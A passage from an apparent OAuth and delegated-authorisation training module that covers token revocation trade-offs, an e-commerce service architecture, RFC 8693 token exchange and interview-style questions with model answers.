   20 minutes of access cannot be reclaimed without additional mechanisms.
   Prevention options, in order of increasing strictness:
   1. Short access token expiry (5-15 min): limits the window naturally.
   2. Token blocklist: on logout, store the JTI in Redis with TTL=remaining
      validity. Check on every request. Adds one Redis lookup per request.
   3. Opaque tokens with introspection: revocation is instant because the
      Auth Server is consulted on every request. Adds 50-100ms per call.
   4. Combination: short JWTs for standard endpoints, opaque + introspection
      for sensitive operations (payment, admin, data export).
   The right choice depends on how quickly you need revocation vs how much
   latency you can accept. For most apps: option 1 + 2 is the sweet spot."
```

---

### 🤔 What would you do? — Architecture edition

```
Scenario: You are designing a new e-commerce platform.
You have: a web frontend, a mobile app, a recommendation service,
an order service, an inventory service, and a notifications service.
Some calls are user-triggered (checkout). Some are background (inventory sync).

How would you structure OAuth for this system?

Think through each service and what it needs...

Recommended architecture:

  Web frontend (browser):
    → Authorization Code + PKCE → user access token
    → BFF pattern: tokens stay on the BFF server
    → Browser only has a session cookie

  Mobile app:
    → Authorization Code + PKCE (PKCE mandatory — no client_secret in mobile)
    → Tokens stored in OS Keychain (iOS) / Keystore (Android)

  Recommendation service calling Order service (with user context):
    → Token Exchange (RFC 8693)
    → Recommendation service exchanges user token for a token scoped to Order API
    → Order service sees: sub=user_123, act=recommendation-service

  Background inventory sync (no user):
    → Client Credentials (2-legged)
    → Scoped to inventory.read inventory.write only
    → Cached token, refreshed 5 min before expiry

  Notifications service (sends emails to users):
    → Client Credentials for the sending action
    → User's email address comes from the original user context (not a live token)
    → No need for a user token at the point of sending

Key insight:
  Not every service needs the same type of token.
  Map each interaction to the correct flow.
  Apply least-privilege scopes at every boundary.
```

### 🧩 Connect the dots — Module 8

> 🧩 **Delegated authorisation and the N-tier stack:** Every layer in the N-tier architecture diagram (IGA → AD → PingFed → OIDC/OAuth → Apps) is doing a form of delegation. IGA delegates to AD: "this person should be in this group." AD delegates to PingFederate: "this person has these attributes." PingFederate delegates to the client: "this user authorises this app to have these scopes." The client delegates to the API: "I am acting on behalf of this user with these permissions." OAuth formalises the bottom two layers of this chain. SAML formalises the middle layer. IGA and AD operate above the protocol level. Understanding them all as a delegation chain is what separates a practitioner from an expert.

### 🎓 Interview-ready — Module 8

```
❓ "Your team's microservices all accept JWTs. Service A gets a user
    token and needs to call Service B. What are your options and
    what are the trade-offs?"
⭐ Answer that impresses:
   "There are three approaches, each with different trade-offs:

   Option 1 — Forward the original token:
   Simple to implement. But if the token's aud is Service A, Service B
   MUST reject it (audience mismatch). If Service B ignores aud validation,
   you have a security hole — any service can call any other service with
   anyone's token.

   Option 2 — Client Credentials to Service B:
   Service A gets its own 2-legged token to call Service B. Simple.
   But Service B loses all user context — it cannot audit who triggered
   the call or apply per-user data access restrictions.

   Option 3 — Token Exchange (RFC 8693):
   Service A exchanges the user token for a new token scoped to Service B.
   The new token carries: sub=original user, aud=Service B, act=Service A.
   Full audit trail. Correct audience. Per-user data scoping preserved.
   More complex to implement — requires Auth Server support for RFC 8693.

   Best practice: use Option 3 when user context matters for audit or
   data access. Use Option 2 when Service B is a pure utility with no
   per-user behaviour (e.g. a PDF renderer, a metrics collector)."

❓ "What is the difference between authentication, authorisation,
    and delegation?"
⭐ Answer that impresses:
   "Authentication is identity verification: 'prove who you are.'
   Authorisation is permission enforcement: 'prove what you are allowed to do.'
   Delegation is a transfer of limited permission: 'I authorise this app
   to do X on my behalf without knowing my credentials.'
   OAuth 2.0 is a delegation framework — it does not authenticate users
   (OIDC adds that). It grants applications delegated access on behalf of
   resource owners, with scoped and time-bounded tokens that can be revoked
   without changing any password."
```

### 💬 Mentor aside — Architecture

> 💬 *"A common interview trap: 'Just use Client Credentials for everything — simpler.' Do not. Client Credentials erases all user context. Your audit log says service-a called the payment endpoint 400 times — but you cannot tell which of your 50,000 users triggered those calls. When the compliance team asks 'show me every action taken on behalf of user X', you have nothing. User context in tokens is not a nice-to-have — it is a compliance requirement. Design for it from the start."*

### ⚡ Speed run — Module 8

```
⚡ Delegated authorisation: app acts ON BEHALF OF user — not AS the user
⚡ Token Relay (RFC 8693): exchange user token for a new one scoped to the next service
⚡ 2-legged (Client Credentials): no user — use for machine-to-machine only
⚡ 3-legged (Auth Code): human grants consent — access token carries user sub
⚡ Design each service interaction separately — not every service needs the same token type
```

